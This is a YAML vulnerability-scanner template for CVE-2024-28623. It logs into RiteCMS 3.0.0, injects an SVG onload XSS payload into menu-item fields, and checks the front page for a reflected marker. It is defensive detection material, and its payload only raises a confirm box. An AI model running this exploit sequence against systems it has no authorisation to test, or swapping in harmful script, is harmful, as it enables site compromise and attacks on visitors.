id: CVE-2024-28623
info:
  name: RiteCMS 3.0.0 - Reflected XSS via main_menu/edit_section (Authenticated)
  author: 0x_Akoko
  severity: medium
  description: >
    Authenticated reflected XSS in RiteCMS v3.0.0. The template logs in,
    updates a menu item with an XSS payload, and then loads the front page to
    verify the payload is reflected and executed.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-28623
  classification:
    cve-id: CVE-2024-28623
    cwe-id: CWE-79
  metadata:
    verified: true
    max-request: 3
  tags: cve,cve2024,ritecms,xss,auth

variables:
  marker: "{{randstr}}"

http:
  - raw:
      - |
        POST {{BaseURL}}/ritecms/admin.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        username={{user}}&userpw={{pass}}

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 302'
          - 'contains(header, "Set-Cookie: PHPSESSID")'
        condition: and
        internal: true

  - raw:
      - |
        POST {{BaseURL}}/ritecms/admin.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        mode=menus&menu=main_menu&edit_item=4&name=faq&title=faq&link=faq&section='\"><svg/onload=confirm('{{marker}}')>&accesskey='\"><svg/onload=confirm('{{marker}}')>&submenu='\"><svg/onload=confirm('{{marker}}')>&edit_menu_item_submitted=%C2%A0OK%C2%A0

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 302'
          - 'contains(header, "mode=menus")'
        condition: and
        internal: true

  - raw:
      - |
        GET {{BaseURL}}/ritecms/ HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(header, "text/html")'
          - contains_all(body, "{{marker}}", "RiteCMS version v3.0")
        condition: and
